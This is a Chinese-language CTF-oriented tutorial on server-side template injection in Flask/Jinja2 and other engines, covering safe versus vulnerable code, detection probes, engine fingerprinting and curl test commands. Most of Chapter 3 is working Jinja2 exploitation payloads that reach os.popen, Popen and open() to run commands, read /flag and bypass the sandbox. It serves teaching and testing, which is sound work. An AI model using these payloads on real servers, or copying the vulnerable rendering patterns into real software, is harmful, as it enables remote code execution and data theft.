---
title: SSTI
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---

# SSTI（服务端模板注入）

## 先看对比：安全写法 vs 危险写法

### 危险写法（以 Flask + Jinja2 为例）

```python
from flask import request, render_template_string

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    template = "<h1>Hello, " + name + "</h1>"  # 用户输入拼入模板源码
    return render_template_string(template)
```

输入 `?name={{7*7}}`，后端实际解析的内容为：

```
<h1>Hello, {{7*7}}</h1>
```

页面输出：

```
<h1>Hello, 49</h1>
```

### 安全写法

```python
from flask import request, render_template_string

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    # 用户输入作为变量值传入，不是模板源码
    return render_template_string("<h1>Hello, {{ name }}</h1>", name=name)
```

同样的输入 `?name={{7*7}}`，页面输出：

```
<h1>Hello, {{7*7}}</h1>
```

输入原样显示，没有执行。

**核心区别**：用户输入在模板中作为"数据"还是"代码"。作为数据时安全，作为代码时存在 SSTI。

### 更多危险写法模式

除了字符串拼接，以下模式同样危险：

```python
# 模式1：f-string 拼接
name = request.args.get("name", "")
template = f"<h1>Hello, {name}</h1>"
return render_template_string(template)

# 模式2：str.format() 拼接
template = "<h1>Hello, {}</h1>".format(name)
return render_template_string(template)

# 模式3：百分号格式化
template = "<h1>Hello, %s</h1>" % name
return render_template_string(template)

# 模式4：用户输入作为整个模板
template = request.args.get("template", "")
return render_template_string(template)

# 模式5：从文件读取模板，但文件名由用户控制
with open(request.args.get("template_file")) as f:
    return render_template_string(f.read())
```

**所有危险模式的共同特征**：用户输入的字符串在传递给模板渲染函数之前，已经被包含在模板字符串内部。无论使用哪种字符串拼接方式，最终到达 `render_template_string()` 的参数中都含有用户输入。

---

## 第1章：场景与原理

### 1.1 什么是 SSTI

**场景**：开发者使用模板引擎（Jinja2、Twig、FreeMarker 等）生成动态页面，但把用户输入直接拼接到模板源码中，导致用户输入的模板语法被引擎额外解析执行。

**原理**：模板引擎的正常工作流程是"固定模板 + 变量数据 → 输出结果"。当用户输入进入"模板"位置而非"数据"位置时，模板引擎会将其中的表达式（如 `{{7*7}}`）作为模板代码执行。

表达式可以被执行 → 访问模板上下文对象 → 调用底层语言功能 → 读取文件或执行系统命令。

> SSTI 的核心判断标准不是"页面上出现了模板符号"，而是**用户输入是否进入了模板源码，并被服务端模板引擎再次解析**。

**模板引擎的本质**：模板引擎是一个文本解析器，它读取模板字符串，识别出其中的特殊语法标记（定界符），将标记内的表达式求值，再将求值结果替换回原始位置。当攻击者能够控制模板字符串本身（而非仅控制变量值）时，就能插入任意表达式。

**三条产生 SSTI 的代码路径**：

1. **直接使用用户输入作为模板源码**：

```python
render_template_string(request.args.get("template"))
```

2. **字符串拼接用户输入到模板**：

```python
render_template_string("<html>" + request.args.get("content") + "</html>")
```

3. **用户输入通过 format 或 % 格式化后成为模板**：

```python
render_template_string("<h1>Hello, %s</h1>" % name)
```

在这三种路径中，攻击者的输入都在模板字符串的层面上被解析，而非在数据变量层面。

### 1.2 SSTI 与 XSS 的边界

| 对比项 | SSTI | XSS |
|--------|------|-----|
| 执行位置 | 服务端（模板引擎） | 浏览器（HTML/JS 引擎） |
| 典型测试 | `{{7*7}}`、`${7*7}` | `<script>alert(1)</script>` |
| 利用目标 | 读文件、配置泄露、RCE | Cookie 窃取、页面篡改 |
| 自动转义是否阻止 | 否（转义不影响表达式计算） | 是（HTML 实体阻止脚本执行） |
| 影响范围 | 可能获取服务器控制权 | 局限于用户浏览器会话 |
| 是否需要用户交互 | 通常不需要 | 存储型需要管理员访问 |

同一输入点可能同时存在 SSTI 和 XSS：先被服务端模板引擎执行（SSTI），输出结果未被转义再导致 XSS。

**判断技巧**：如果测试 `{{7*7}}` 在页面源代码中变为 `49`，是 SSTI；如果页面源代码中仍然是 `{{7*7}}` 但浏览器显示 `49`，则可能是前端框架（如 Vue/Angular）的客户端模板编译，不是 SSTI。

 **新手避坑**：不要只通过浏览器查看页面来判断 SSTI。浏览器会执行前端框架的模板语法（Vue 的 `{{}}`、Angular 的 `{{}}`），导致误判。始终使用 curl 或 BurpSuite 查看原始响应。

### 1.3 常见入口场景

CTF 和实战中应优先检查以下功能点：

- 自定义欢迎语、昵称、个人简介（用户输入显示在页面上）
- 邮件正文 / 标题模板（用户输入参与邮件内容生成）
- 在线生成 PDF / 简历 / 证书（模板内容由用户定义）
- 自定义错误页面 / 404 页面
- CMS 主题编辑器、页面模板自定义
- Markdown / Wiki 内容预览后的二次渲染
- 根据用户配置生成配置文件
- 社交平台分享标题/描述的模板
- SQL 报错页面/错误日志页面

**危险 API 详细汇总**（按语言分层，含更多框架）：

| 语言 | 框架/模板库 | 危险调用模式 |
|------|------------|-------------|
| Python | Flask + Jinja2 | `render_template_string(user_input)` |
| Python | Jinja2 原生 | `env.from_string(user_input).render()` |
| Python | Mako | `Template(user_input).render()` |
| Python | Tornado | `tornado.template.Template(user_input).generate()` |
| PHP | Twig | `$twig->createTemplate($input)->render()` |
| PHP | Smarty | `$smarty->fetch("string:" . $input)` |
| PHP | Smarty | `$smarty->display("string:" . $input)` |
| PHP | Blade (Laravel) | `Blade::compileString($input)`（需额外处理） |
| Java | FreeMarker | `new Template("t", new StringReader(input), cfg)` |
| Java | Thymeleaf | `templateEngine.process(input, context)` |
| Java | Velocity | `Velocity.evaluate(context, writer, "", input)` |
| Node.js | EJS | `ejs.render(input, data)` |
| Node.js | Pug | `pug.render(input)` |
| Node.js | Nunjucks | `nunjucks.renderString(input, data)` |
| Node.js | Handlebars | `Handlebars.compile(input)(data)` |
| Node.js | Lodash template | `_.template(input)(data)` |
| Ruby | ERB | `ERB.new(input).result(binding)` |
| Ruby | Slim | `Slim::Template.new(input).render` |
| Go | text/template | `template.New("t").Parse(input)` |
| Go | html/template | `template.New("t").Parse(input)` |
| Go | Pongo2 | `pongo2.Render(input, ctx)` |

**用户输入来源不限于 GET 参数**，POST 表单、JSON、Cookie、请求头（User-Agent、Referer）、上传文件名/EXIF、数据库存储字段、URL 路径都可能成为注入点。

 **新手避坑**：用户控件模板文件名（如 `render_template("user_" + input + ".html")`）通常属于目录穿越或任意模板加载，不直接等于 SSTI。SSTI 的核心是**用户输入被当成模板代码执行**，而非仅仅决定加载哪个文件。

 **新手避坑**：`str.format()` 的属性访问（`{0.__class__}`）不属于模板引擎。这是 Python 字符串格式化自身的功能，应和 SSTI 区分。一条经验法则：如果最终调用的是模板渲染函数（`render_template_string`、`Template().render()` 等），才是 SSTI。

### 1.4 SSTI 的危害分级

| 等级 | 能力 | 所需条件 |
|------|------|----------|
| L1 | 表达式计算（确认注入） | 模板引擎解析用户输入中的定界符 |
| L2 | 读取模板上下文变量 | 上下文对象暴露在模板中 |
| L3 | 读取框架配置（如 Flask SECRET_KEY） | 配置对象在上下文中可访问 |
| L4 | 读取服务端文件 | Open() 函数可达或内置函数可用 |
| L5 | 执行系统命令（RCE） | os / subprocess / Runtime 等可达 |
| L6 | 反弹 Shell / 内网横向 | 网络连通，目标有对应工具 |

**实战策略**：到达 L4（读文件）通常已能拿到 flag，不一定非要追求 L5-L6。

### 1.5 SSTI 利用的通用思维链

```
① 找到用户输入回显的位置
    ↓
② 用数学表达式测试是否被模板引擎执行
    ↓
③ 确定模板引擎类型（指纹识别）
    ↓
④ 枚举模板上下文对象
    ↓
⑤ 寻找可达的危险函数/类
    ↓
⑥ 读文件或执行命令
    ↓
⑦ 无回显时使用带外/延时盲测
```

### 1.6 SSTI 的核心原理深入

**模板渲染的两阶段模型**：

```
阶段一（编译阶段）：模板源码 → 抽象语法树（AST）→ 可执行代码
阶段二（执行阶段）：可执行代码 + 上下文数据 → 输出字符串
```

SSTI 发生的根本原因：**用户输入进入了阶段一的输入（模板源码），而不是阶段二的输入（上下文数据）**。

**用代码来理解两个阶段**：

```python
# 安全：用户输入是数据
# 阶段一：编译固定模板
template = env.from_string("<h1>Hello {{ name }}!</h1>")
# 阶段二：传入数据执行
output = template.render(name=user_input)  # user_input 作为数据

# 危险：用户输入被编译
# 阶段一：编译包含用户输入的模板
template = env.from_string("<h1>Hello " + user_input + "!</h1>")
# 阶段二：执行（此时 user_input 已被编译，其中的 {{ }} 会被执行）
output = template.render()
```

理解这两个阶段对于分析 SSTI 至关重要。所有绕过和利用本质上都是在尝试控制"编译阶段"的输入内容。

**模板引擎的编译行为差异**：

| 特征 | Jinja2 | Twig | FreeMarker | EJS |
|------|--------|------|------------|-----|
| 编译+缓存 | 默认缓存编译结果 | 默认缓存 | 默认缓存 | 每次 render 编译 |
| 编译错误 | 抛出 TemplateSyntaxError | Twig\Error\SyntaxError | freemarker.core.TemplateException | SyntaxError |
| 字符串内表达式 | 支持 `"a{{b}}c"` | 不支持 | 不支持 | 不支持 |

不同模板引擎在编译阶段的差别，决定了某些绕过技巧只在特定引擎中有效。

### 1.7 SSTI 在各种框架中的表现形式

**Flask（Python）**：

```python
# 判断特征：响应头中有 Server: Werkzeug/版本
# Cookie 格式：session=eyJxxx.Yyyy.Zzz（Flask 签名格式）
# 报错页面显示 Flask/Werkzeug 版本
```

**Symfony（PHP）**：

```php
// 判断特征：响应头中有 X-Symfony-Debug
// Cookie 格式：PHPSESSID=xxx
// 报错显示 Symfony 版本和 Twig 错误
```

**Spring Boot（Java）**：

```java
// 判断特征：响应头中有 X-Application-Context
// 默认错误页面是 Whitelabel Error Page
// 路径有 /actuator/ 端点
```

**Express + EJS/Pug（Node.js）**：

```javascript
// 判断特征：Server 头可能是 Express
// 模板扩展名为 .ejs 或 .pug
```

---

## 第2章：判断流程（实战第一步）

### 2.1 数学表达式探测

不要一开始就执行 `id`、`whoami`。先用无害数学表达式确认输入进入模板引擎。

 **新手避坑**：如果响应中出现 `49`，先确认它是你的 payload 计算出来的，不是页面本来就有的数字。方法是在表达式前后加唯一标记，如 `ssti{{7*7}}test`，确认返回 `ssti49test`。

通用探测 payload（按引擎类型分组）：

```
{{7*7}}          # Jinja2 / Twig / Nunjucks / Tornado
${7*7}           # Mako / FreeMarker / Thymeleaf
<%= 7*7 %>       # EJS / ERB
#{7*7}           # Pug
{$smarty.version} # Smarty
```

**加前后缀降低误判**：

```
ssti{{7*7}}test
ssti${7*7}test
ssti<%= 7*7 %>test
```

如果返回 `ssti49test`，说明表达式被执行。

**测试多个输入位置**（curl 示例）：

```bash
# GET 参数
curl -G "http://target/" --data-urlencode "name=ssti{{7*7}}test"

# POST 表单
curl -X POST "http://target/" --data-urlencode "name=ssti{{7*7}}test"

# JSON
curl -X POST "http://target/api" -H "Content-Type: application/json" \
  -d '{"name":"ssti{{7*7}}test"}'

# Cookie
curl "http://target/" -H "Cookie: name=ssti{{7*7}}test"

# User-Agent 请求头
curl "http://target/" -H "User-Agent: ssti{{7*7}}test"

# X-Forwarded-For 请求头
curl "http://target/" -H "X-Forwarded-For: ssti{{7*7}}test"
```

 **新手避坑**：如果 GET 参数不过滤，但请求头不过滤，那么通过 User-Agent 或其他请求头注入往往能绕过前端和 WAF 限制。

### 2.2 引擎指纹识别

相同定界符可能属于不同引擎，用多组测试交叉验证：

| 测试表达式 | Jinja2 | Twig | Mako | FreeMarker | EJS | Go template |
|------------|--------|------|------|------------|-----|-------------|
| `{{7*7}}` | 49 | 49 | 原样/报错 | 原样/报错 | 原样 | 报错 |
| `{{7*'7'}}` | 7777777 | 49 | 原样 | 原样 | 原样 | 报错 |
| `${7*7}` | 原样 | 原样 | 49 | 49 | 原样 | 原样 |
| `{{config}}` | 配置内容（Flask） | 原样 | 原样 | 原样 | 原样 | 原样 |
| `{{7*"7"}}` | 7777777 | 49 | — | — | — | — |

**关键区分思路**：Python 支持字符串乘法（`"7" * 7 = "7777777"`），PHP/JS 中字符串乘数字会自动转数字（`"7" * 7 = 49`）。

**扩展指纹测试**：

```text
# Jinja2 特有过滤器测试
{{"abc"|upper}}       → "ABC"（多数引擎支持）
{{"abc"|reverse}}     → "cba"（Jinja2 特有，需确认过滤器存在）

# Flask/Jinja2 上下文特有对象
{{config}}             # Flask 配置对象
{{request}}            # Flask 请求对象
{{self}}               # Jinja2 当前模板对象

# Twig 特有对象
{{_self}}              # Twig 当前模板对象
{{app}}                # Symfony 应用对象
{{_context}}           # Twig 全部上下文变量

# FreeMarker 特有
${.data_model}         # 数据模型
${.globals}            # 全局变量
${.vars}               # 当前变量

# Velocity 特有
#set($x=7*7)$x

# Smarty 特有
{$smarty.version}
{$smarty.now}
```

### 2.3 错误指纹

故意构造语法错误触发异常信息：

```
{{7*
${7*
<%= 7*
{% if %}
```

| 报错关键词 | 模板引擎 |
|-------------|----------|
| `jinja2.exceptions.TemplateSyntaxError` | Jinja2 |
| `jinja2.exceptions.UndefinedError` | Jinja2 |
| `Twig\Error\SyntaxError` | Twig |
| `SmartyCompilerException` | Smarty |
| `freemarker.core.TemplateException` | FreeMarker |
| `freemarker.template.TemplateException` | FreeMarker |
| `org.thymeleaf.TemplateInputException` | Thymeleaf |
| `org.thymeleaf.exceptions.TemplateProcessingException` | Thymeleaf |
| `MakoException` | Mako |
| `mako.exceptions.CompileException` | Mako |
| `ejs` / `SyntaxError in template` | EJS |
| `Pug` / `PugError` | Pug |
| `ActionView::Template` / `ERB` | ERB |
| `template: ... unexpected` | Go template |
| `org.apache.velocity.exception.ParseErrorException` | Velocity |

 **新手避坑**：
- 浏览器显示 `49` 不一定 SSTI（Angular/Vue 前端也会计算模板）。要用 curl 看原始响应。
- 返回原样 `{{7*7}}` 说明没有 SSTI（未被执行）。
- HTML 转义不能阻止 SSTI，只能转义输出中的特殊字符。
- 某些框架会统一捕获异常并显示自定义错误页面，此时报错指纹不可用。

### 2.4 二次渲染（存储型 SSTI）

某些功能先保存用户内容，后续在预览页/管理页/导出时才渲染模板。

测试流程：
1. 提交唯一标记 `ssti_随机字符串`
2. 找到内容展示、预览、导出、邮件等功能
3. 确认原始内容在哪个页面出现
4. 再提交 `ssti{{7*7}}test`
5. 观察后续页面是否显示 `ssti49test`

常见场景：昵称保存后后台管理页面渲染、邮件模板保存后发送时解析、Markdown 导出 PDF 时二次处理。

**二次渲染的特例——双层模板解析**：

```python
# 场景：第一次渲染输出中包含 {{...}}，再被第二次渲染
template1 = render_template_string("Hello {{ name }}", name=user_input)
# 如果 user_input = "{{7*7}}"
# template1  = "Hello {{7*7}}"
template2 = render_template_string(template1)
# template2 = "Hello 49"
```

这种场景在 Markdown 渲染后再经过模板引擎时可能出现。测试时先提交 `{{7*7}}`，再找二次展示的地方看是否变成 `49`。

### 2.5 判断流程决策树

```
输入回显？——否——> 检查其他输入位置 / 二次渲染点
    |
    是
    ↓
{{7*7}} → 49？——是——> SSTI 确认
    |                    ↓
    否              确定模板引擎类型
    ↓                    |
${7*7} → 49？——是——> Mako/FreeMarker/Thymeleaf
    |
    否
    ↓
<%= 7*7 %> → 49？——是——> EJS/ERB
    |
    否
    ↓
#{...} / {$smarty} / #set() 等特殊语法测试
```

---

## 第3章：Jinja2 利用（核心3条链）

### 3.1 基础语法回顾

```jinja2
{{7*7}}                    # 算术表达式
{{"abc"|upper}}            # 过滤器
{{"a" ~ "b"}}              # 字符串拼接
{{obj.attr}}               # 属性访问
{{obj["attr"]}}            # 下标访问
{{obj|attr("attr")}}       # attr 过滤器（绕过利器）
{% if cond %}...{% endif %} # 控制语句
{% set x = value %}        # 变量赋值
{% for x in list %}...{% endfor %}  # 循环
{% block name %}...{% endblock %}   # 模板继承
{% include "file" %}       # 包含其他模板
{% macro name(args) %}...{% endmacro %}  # 宏定义
```

**常用过滤器对照表**：

```jinja2
{{"abc"|length}}           # 3
{{"ABC"|lower}}            # "abc"
{{"abc"|upper}}            # "ABC"
{{"abc"|reverse}}          # "cba"
{{" abc "|trim}}           # "abc"
{{"abc"|capitalize}}       # "Abc"
{{"abc"|title}}            # "Abc"
{{"hello world"|wordcount}} # 2
```

**列表过滤器**：

```jinja2
{{[3,1,2]|first}}          # 3
{{[3,1,2]|last}}           # 2
{{[3,1,2]|length}}         # 3
{{[3,1,2]|sort}}           # [1,2,3]
{{[3,1,2]|reverse}}        # [2,1,3]
{{[1,2,3]|join(",")}}      # "1,2,3"
{{[1,2,3]|sum}}            # 6
{{[1,2,3]|first}}          # 1
```

**类型转换与安全**：

```jinja2
{{123|string}}             # "123"
{{"123"|int}}              # 123
{{"<script>"|e}}           # "&lt;script&gt;"（HTML 转义）
{{"<script>"|escape}}      # "&lt;script&gt;"
{{"<script>"|safe}}        # "<script>"（标记为安全，不转义）
```

**字典过滤器**：

```jinja2
{{{"a":1,"b":2}|items}}    # [("a",1),("b",2)]
{{{"a":1,"b":2}|length}}   # 2
```

**Jinja2 的测试器（Tests）**：

```jinja2
{{"abc" is defined}}       # True（变量是否定义）
{{"" is defined}}          # True
{{undefined_var is defined}} # False
{{"abc" is string}}        # True
{{123 is number}}          # True
{{[1,2] is iterable}}      # True
{{1 is odd}}               # True
{{2 is even}}              # True
```

测试器在探测阶段可以帮助确认对象是否存在：

```jinja2
{% if config is defined %}
  config 可用!
{% endif %}

{% if lipsum is defined %}
  lipsum 可用!
{% endif %}
```

**过滤器常用于取长度、截取、类型转换**：

```jinja2
{{"abc"|length}}           # 3
{{"ABC"|lower}}            # "abc"
{{"abc"|join(",")}}        # "a,b,c"
{{"<script>"|e}}           # HTML 转义
{{123|string}}             # "123"
{{[1,2,3]|first}}          # 1
{{[1,2,3]|last}}           # 3
{{[1,2,3]|join}}           # "123"
```

### 3.2 Flask 上下文探测

先查看模板上下文中已暴露的对象：

```jinja2
{{config}}
{{config.items()}}
{{request}}
{{request.environ}}
{{session}}
{{url_for}}
{{get_flashed_messages}}
{{g}}
{{range}}
{{lipsum}}
{{cycler}}
{{joiner}}
{{namespace}}
```

**关键对象逐一检查**：

```jinja2
# config 对象
{{config}}
{{config["SECRET_KEY"]}}
{{config.SECRET_KEY}}
{{config.items()}}
{{config.__class__}}

# request 对象
{{request}}
{{request.args}}
{{request.form}}
{{request.cookies}}
{{request.headers}}
{{request.environ}}
{{request.application}}

# session 对象
{{session}}
{{session.items()}}

# 内置全局函数
{{range(10)}}
{{lipsum.__globals__}}
{{cycler.__init__.__globals__}}
```

重点关注 `config` 中的 `SECRET_KEY` 和 `request.environ` 中的环境变量。

```jinja2
{{config["SECRET_KEY"]}}
{{config.__class__.__init__.__globals__}}
```

### 3.3 Python 对象链逐层详解（慢速拆解）

Jinja2 SSTI 的核心是利用 Python 的对象模型，从任意基础类型出发，沿着魔术属性一步步爬到危险函数。下面逐层解释每个步骤。

#### 第一步：选择一个起始对象

在 Jinja2 模板中，任何 Python 对象都可以作为起点。空元组 `()`、空字符串 `""`、空列表 `[]` 是最常见选择，因为它们语法简短。

```jinja2
{{()}}
{{""}}
{{[]}}
```

这些在 Python 中都是字面量，不需要定义变量。

#### 第二步：`__class__`——获取对象的类

每个 Python 对象都有一个 `__class__` 属性，指向创建它的类。

```jinja2
{{().__class__}}
```

预期输出：

```
<class 'tuple'>
```

同理：

```jinja2
{{"".__class__}}
```

输出：

```
<class 'str'>
```

**为什么需要这一步？**因为 Python 中整数、字符串、列表等内置类型的对象，通过 `__class__` 才能到达它们的类对象。类对象才具有 `__base__`、`__mro__`、`__subclasses__()` 等进一步探索需要的属性。

#### 第三步：`__base__` 或 `__mro__`——获取父类

从类对象出发，`__base__` 返回直接父类。

```jinja2
{{().__class__.__base__}}
```

预期输出：

```
<class 'object'>
```

所有类最终都继承自 `object`，所以从任何内置类型出发，沿着 `__base__` 走一次（或通过 `__mro__` 取最后一个元素）都能到达 `object` 类。

还有一种写法是通过 `__mro__`（方法解析顺序，Method Resolution Order）：

```jinja2
{{().__class__.__mro__}}
```

输出类似：

```
(<class 'tuple'>, <class 'object'>)
```

访问最后一个元素：

```jinja2
{{().__class__.__mro__[1]}}
{{().__class__.__mro__[-1]}}
```

也得到 `object`。

**为什么非要到 `object`？**因为 `object` 是 Python 类继承树的根，它的 `__subclasses__()` 会返回**当前解释器中所有已加载类的直接子类**。这意味着只要程序中导入过某个模块，它的类就会出现在这个列表中。

#### 第四步：`__subclasses__()`——获取所有子类

```jinja2
{{().__class__.__base__.__subclasses__()}}
```

这会输出一个非常长的列表，包含当前 Python 进程中所有直接继承自 `object` 的类。

**输出片段示例**：

```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>,
 <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>,
 <class 'bytes'>, <class 'list'>, <class 'NoneType'>,
 <class 'NotImplementedType'>, ...]
```

这个列表的长度和内容取决于：
- Python 版本（2.7 vs 3.6 vs 3.11 差异很大）
- 已经 import 的模块
- Flask 及其插件的版本
- 应用启动时加载的所有依赖

 **新手避坑**：不同环境下 `__subclasses__()` 的**顺序完全不同**。永远不要从网上复制一个固定下标（如 `[276]`）到你的 payload 中，这个下标在另一个环境中指向完全不同的类。

#### 第五步：在子类列表中寻找危险类

常见的危险目标类包括：

| 目标类 | 所属模块 | 用途 |
|--------|---------|------|
| `subprocess.Popen` | subprocess | 执行命令 |
| `warnings.catch_warnings` | warnings | 通过 `__init__.__globals__` 访问 `__builtins__` |
| `builtins.__import__` | builtins | 动态导入模块 |
| `os.popen` 或 `os.system` | os | 执行命令 |
| `_io.FileIO` | io | 直接操作文件 |
| `types.FunctionType` | types | 创建函数对象 |

**查找 `catch_warnings` 类**：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__name__}}
  {% endif %}
{% endfor %}
```

如果输出 `catch_warnings`，说明该类已被加载。

**查找其他类**：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "Popen" %}
    {{c.__name__}}
  {% endif %}
{% endfor %}
```

#### 第六步：通过 `__init__.__globals__` 获取全局变量

找到目标类（如 `catch_warnings`）后，访问它的 `__init__` 方法（构造函数），再访问该方法的 `__globals__` 属性。

`__globals__` 是函数对象的一个属性，指向函数定义所在模块的全局命名空间（一个 dict）。

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__init__.__globals__.keys()}}
  {% endif %}
{% endfor %}
```

`c.__init__.__globals__` 返回的是 `warnings` 模块的全局变量字典。这个字典中通常包含：

- `__builtins__`：Python 内置函数的引用（open、__import__、eval、exec 等）
- `__name__`：模块名
- `__file__`：模块文件路径
- 模块中定义的所有函数和变量

在某些情况下，如果 `os` 模块已经被 `warnings` 或其依赖模块导入，`__globals__` 中甚至直接含有 `os`。

#### 第七步：从 `__builtins__` 调用危险函数

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__init__.__globals__["__builtins__"]["open"]("/flag").read()}}
  {% endif %}
{% endfor %}
```

`__builtins__` 是一个模块或字典，包含所有 Python 内置函数。通过它可以访问：

- `open()` — 读取文件
- `__import__()` — 动态导入模块
- `eval()` — 执行 Python 代码
- `exec()` — 执行 Python 代码

**完整链式示意图**：

```
空元组 ()
    → __class__ → tuple 类
    → __base__ → object 类
    → __subclasses__() → [所有已加载类]
    → 过滤找到 catch_warnings 类
    → __init__ → catch_warnings 的构造函数（函数对象）
    → __globals__ → warnings 模块全局变量字典
    → ["__builtins__"] → Python 内置函数
    → ["open"] → open() 函数
    → ("/flag") → 文件对象
    → .read() → 文件内容
```

**更短的替代路径**：如果 `os` 已经出现在 `__globals__` 中，可以直接通过 `os` 执行命令：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__init__.__globals__["os"].popen("id").read()}}
  {% endif %}
{% endfor %}
```

#### 不依赖固定下标的通用查找

不要写死下标，用循环遍历整个列表：

```jinja2
# 法一：通过 builtins 导入 os
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}
  {% endif %}
{% endfor %}

# 法二：直接使用已有的 os
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__init__.__globals__.get("os") %}
    {{c.__init__.__globals__["os"].popen("id").read()}}
  {% endif %}
{% endfor %}

# 法三：直接查找 Popen 类（如果已加载）
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "Popen" %}
    {{c("id", shell=True, stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}

# 法四：通过 _io.FileIO 读文件
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "FileIO" %}
    {{c("/flag").read()}}
  {% endif %}
{% endfor %}
```

 **新手避坑**：
- `os.popen().read()` 返回字符串输出，而 `os.system()` 返回退出码没有输出。
- `os.popen()` 在 Python 3 中仍然可用，但官方推荐 `subprocess` 模块。
- 不是每个类都一定在 `__subclasses__()` 列表中，如果应用没有加载 `warnings` 模块，就找不到 `catch_warnings`。
- `__builtins__` 可能是模块也可能是字典，取决于引用方式。在有些环境中需要用 `c.__init__.__globals__["__builtins__"].__dict__["open"]`。

### 3.4 三条核心利用链

#### 链一：短链直接利用（优先尝试）

利用 Jinja2 内置全局对象直接到达 `os` 模块或 `__builtins__`。

```jinja2
# 通过 cycler 读取文件
{{cycler.__init__.__globals__.__builtins__["open"]("/flag").read()}}

# 通过 cycler 执行命令
{{cycler.__init__.__globals__.os.popen("id").read()}}

# 通过 lipsum（更短的对象名）
{{lipsum.__globals__["os"].popen("id").read()}}

# 通过 joiner
{{joiner.__init__.__globals__.os.popen("id").read()}}

# 通过 namespace
{{namespace.__init__.__globals__.os.popen("id").read()}}

# 通过 range 函数
{{range.__class__.__init__.__globals__.os.popen("id").read()}}
```

> 为什么优先用短链？因为不需要枚举子类，payload 简短，失败切换成本低。

**各种短链的底层原理**：

Jinja2 在渲染时会自动注入几个全局对象到模板命名空间。这些全局对象包括 `cycler`、`joiner`、`namespace`、`lipsum`、`range`、`dict`、`lipsum` 等。它们都是 Python 函数或类对象，通过 `__globals__` 或 `__init__.__globals__` 可以访问到定义它们的模块的全局变量。

- `lipsum` 是一个函数（用于生成 Lorem Ipsum 文本），函数的 `__globals__` 直接指向 Jinja2 工具模块的全局变量。
- `cycler`/`joiner`/`namespace` 是类对象，需要通过 `__init__.__globals__` 获取其构造函数的全局变量。

#### 链二：对象继承链通用利用

当短链对象不可用时，使用 Python 对象链寻找危险类。

```jinja2
# 从空元组出发
{{().__class__.__base__.__subclasses__()}}
```

链式含义：

| 步骤 | 表达式 | 结果 |
|------|--------|------|
| 取类 | `().__class__` | `<class 'tuple'>` |
| 取基类 | `().__class__.__base__` | `<class 'object'>` |
| 取所有子类 | `().__class__.__base__.__subclasses__()` | 已加载的全部类列表 |

**不依赖固定下标**，用循环按类名查找：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}
  {% endif %}
{% endfor %}
```

查找 `Popen` 类：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "Popen" %}
    {{c("id", shell=True, stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}
```

#### 链三：通过 request 对象到达全局

```jinja2
{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}
```

此链依赖 Flask 的 `request` 对象在模板中可用，且其 `application` 属性指向 Flask 应用。

**其他 request 路径变体**：

```jinja2
{{request.environ.__class__.__init__.__globals__.__builtins__["open"]("/flag").read()}}
{{request.args.__class__.__base__.__subclasses__()}}
```

### 3.5 三条链的选择策略

```
链一（短链） → 成功则结束
     ↓ 失败
链二（子类枚举） → 成功则结束
     ↓ 失败
链三（request 路径） → 评估上下文对象
     ↓ 全部失败
分析沙箱策略，寻找其他上下文对象
```

 **新手避坑**：
- `os.popen().read()` 返回字符串输出，而 `os.system()` 返回退出码没有输出。
- 精简容器可能没有 `cat`、`bash`、`curl`，优先用 Python `open()` 读文件。
- 不同 Python/Jinja2 版本下 `__subclasses__()` 的顺序完全不同，永远不要抄固定下标。
- 能直接 `open("/flag").read()` 时不需要执行命令。
- `lipsum` 是函数对象（不是类），所以直接用 `__globals__`，不需要 `__init__`。
- `cycler` 是类对象，所以需要 `__init__.__globals__`。

### 3.6 Jinja2 利用的进阶技巧

#### 一次性查看所有子类的名称

在需要快速浏览可用类时，可以用循环输出所有类名：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {{c.__name__}}
{% endfor %}
```

这会在页面输出一长串类名，可供后续选择目标。

#### 多种类名匹配方式的对比

```jinja2
# 精确匹配（推荐）
{% if c.__name__ == "catch_warnings" %}

# 包含匹配（当类名不确定时）
{% if "warning" in c.__name__ %}

# 前缀匹配
{% if c.__name__.startswith("catch") %}

# 正则匹配（需要 re 模块在上下文中，不常用）
```

#### 一次性检查多个工具的可用性

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ in ["catch_warnings", "Popen", "FileIO", "BuiltinImporter"] %}
    {{c.__name__}}已加载,
  {% endif %}
{% endfor %}
```

### 3.7 Jinja2 沙箱绕过思路

Jinja2 提供 `SandboxedEnvironment`，会阻止访问以下划线开头的属性。常用绕过方法：

```jinja2
# 方法1：使用 attr 过滤器
{{()|attr("__class__")}}

# 方法2：使用 | 和 attr 组合
{{""|attr("\x5f\x5fclass\x5f\x5f")}}

# 方法3：通过 request.args 传入属性名
{{()|attr(request.args.a)}}&a=__class__

# 方法4：利用 Jinja2 的内置函数/过滤器返回可操作对象
{{config}}
{{config.from_object}}
```

